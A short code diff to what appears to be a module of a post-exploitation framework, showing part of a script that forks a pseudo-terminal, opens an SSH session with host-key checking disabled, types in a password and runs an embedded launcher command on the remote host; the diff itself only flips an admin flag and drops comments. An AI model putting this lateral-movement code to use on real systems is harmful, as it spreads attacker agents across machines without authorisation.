@@ -21,7 +21,7 @@ class Module:
             'OutputExtension' : "",
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : False,
+            'NeedsAdmin' : True,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : True,
@@ -110,18 +110,16 @@ class Module:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         script = """
-
 import os
 import pty
 
 def wall(host, pw):
     import os,pty
     pid, fd = pty.fork()
-    if pid == 0: # Child
+    if pid == 0:
         os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '%s'])
         os._exit(1) # fail to execv
 
-    # read '..... password:', write password
     os.read(fd, 1024)
     os.write(fd, '\\n' + pw + '\\n')
 
